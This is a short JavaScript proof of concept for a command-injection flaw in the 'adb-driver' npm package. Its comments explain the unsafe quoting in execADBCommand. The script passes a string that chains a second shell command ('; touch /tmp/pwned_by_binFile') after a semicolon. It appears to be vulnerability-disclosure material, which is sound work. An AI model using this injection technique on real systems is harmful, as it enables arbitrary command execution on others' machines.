```javascript
const { execADBCommand } = require("./node_modules/adb-driver");

// binFile in execADBCommand() only quotes cmd[0]; the rest of the
// attacker-controlled command string is rejoined and handed to
// child_process.exec(), which runs it through a shell. Any shell
// metacharacters after the first space escape the intended adb
// invocation and execute arbitrary commands.
const maliciousCommand = 'devices; touch /tmp/pwned_by_binFile';

execADBCommand(maliciousCommand).then((out) => {
  console.log("adb output:", out);
  console.log("Command injection triggered via binFile/execADBCommand.");
});
```
